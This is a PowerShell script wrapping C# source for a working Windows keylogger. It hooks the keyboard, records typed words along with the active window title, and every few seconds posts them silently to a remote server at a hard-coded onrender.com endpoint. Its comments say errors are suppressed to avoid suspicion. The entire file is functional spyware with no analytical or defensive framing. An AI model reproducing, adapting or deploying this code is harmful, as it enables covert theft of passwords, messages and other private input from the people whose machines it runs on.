Add-Type -TypeDefinition @"
using System;
using System.IO;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Text;
using System.Net;
using System.Threading;
using System.Collections.Generic;

namespace KeyLogger {
  public static class Program {
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    
    // Add Window Title Detection
    private const int GW_HWNDNEXT = 2;
    private const int WM_GETTEXT = 0x000D;
    private static string currentWord = "";
    private static string currentWindowTitle = "";
    private static HookProc hookProc = HookCallback;
    private static IntPtr hookId = IntPtr.Zero;
    
    private static System.Threading.Timer sendTimer;
    private static object lockObject = new object();
    
    public static void Main() {
      hookId = SetHook(hookProc);
      sendTimer = new System.Threading.Timer(SendWordsToServer, null, 2000, 3000); // start after 2s, send every 3s
      Application.Run();
      UnhookWindowsHookEx(hookId);
    }
    
    private static IntPtr SetHook(HookProc hookProc) {
      IntPtr moduleHandle = GetModuleHandle(Process.GetCurrentProcess().MainModule.ModuleName);
      return SetWindowsHookEx(WH_KEYBOARD_LL, hookProc, moduleHandle, 0);
    }

    private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);

    private static void SendWordToServer(string word) {
      ThreadPool.QueueUserWorkItem(state => {
        try {
          string jsonBody = "{ \"words\": \"" + word + "\", \"window_title\": \"" + currentWindowTitle + "\" }";
          string url = "https://me2-sju2.onrender.com/captures";
          var webRequest = WebRequest.Create(url);
          webRequest.Method = "POST";
          byte[] byteArray = Encoding.UTF8.GetBytes(jsonBody);
          webRequest.ContentType = "application/json";
          webRequest.ContentLength = byteArray.Length;

          using (Stream dataStream = webRequest.GetRequestStream()) {
            dataStream.Write(byteArray, 0, byteArray.Length);
          }

          var response = webRequest.GetResponse();
          response.Close();
        } catch {
          // Silently ignore to avoid suspicion
        }
      });
    }

    private static void SendWordsToServer(object state) {
      lock (lockObject) {
        if (!string.IsNullOrEmpty(currentWord)) {
          SendWordToServer(currentWord);
          currentWord = "";
        }
      }
    }

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
      if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
        int vkCode = Marshal.ReadInt32(lParam);
        Keys key = (Keys)vkCode;
        bool isShift = (Control.ModifierKeys & Keys.Shift) != 0;

        if (key == Keys.Shift || key == Keys.ControlKey || key == Keys.Menu) {
          return CallNextHookEx(hookId, nCode, wParam, lParam);
        }

        string keyText = "";

        // Detect active window title
        currentWindowTitle = GetActiveWindowTitle();

        Dictionary<int, string> normalSymbols = new Dictionary<int, string> {
          { 0xBA, ";" }, { 0xBB, "=" }, { 0xBC, "," }, { 0xBD, "-" },
          { 0xBE, "." }, { 0xBF, "/" }, { 0xC0, "`" }, { 0xDB, "[" },
          { 0xDC, "\\" }, { 0xDD, "]" }, { 0xDE, "'" }
        };

        Dictionary<int, string> shiftSymbols = new Dictionary<int, string> {
          { 0x31, "!" }, { 0x32, "@" }, { 0x33, "#" }, { 0x34, "$" },
          { 0x35, "%" }, { 0x36, "^" }, { 0x37, "&" }, { 0x38, "*" },
          { 0x39, "(" }, { 0x30, ")" }, { 0xBA, ":" }, { 0xBB, "+" },
          { 0xBC, "<" }, { 0xBD, "_" }, { 0xBE, ">" }, { 0xBF, "?" },
          { 0xC0, "~" }, { 0xDB, "{" }, { 0xDC, "|" }, { 0xDD, "}" },
          { 0xDE, "\"" }
        };

        if (key >= Keys.A && key <= Keys.Z) {
          keyText = isShift ? key.ToString() : key.ToString().ToLower();
        }
        else if (key >= Keys.D0 && key <= Keys.D9) {
          keyText = isShift && shiftSymbols.ContainsKey(vkCode)
            ? shiftSymbols[vkCode]
            : key.ToString().Replace("D", "");
        }
        else if (key >= Keys.NumPad0 && key <= Keys.NumPad9) {
          keyText = key.ToString().Replace("NumPad", "");
        }
        else if (vkCode == 0x20) {
          keyText = " ";
        }
        else if (vkCode == 0x08) {
          if (currentWord.Length > 0) {
            lock (lockObject) {
              currentWord = currentWord.Substring(0, currentWord.Length - 1);
            }
          }
        }
        else if (isShift && shiftSymbols.ContainsKey(vkCode)) {
          keyText = shiftSymbols[vkCode];
        }
        else if (normalSymbols.ContainsKey(vkCode)) {
          keyText = normalSymbols[vkCode];
        }

        if (!string.IsNullOrEmpty(keyText)) {
          lock (lockObject) {
            currentWord += keyText;
          }
        }
      }

      return CallNextHookEx(hookId, nCode, wParam, lParam);
    }

    private static string GetActiveWindowTitle() {
      IntPtr hwnd = GetForegroundWindow();
      int length = GetWindowTextLength(hwnd);
      StringBuilder windowTitle = new StringBuilder(length + 1);
      GetWindowText(hwnd, windowTitle, windowTitle.Capacity);
      return windowTitle.ToString();
    }

    [DllImport("user32.dll")]
    private static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll")]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll")]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("user32.dll")]
    private static extern IntPtr GetForegroundWindow();

    [DllImport("user32.dll")]
    private static extern int GetWindowTextLength(IntPtr hwnd);

    [DllImport("user32.dll")]
    private static extern int GetWindowText(IntPtr hwnd, StringBuilder lpString, int nMaxCount);
  }
}
"@ -ReferencedAssemblies System.Windows.Forms

[KeyLogger.Program]::Main();
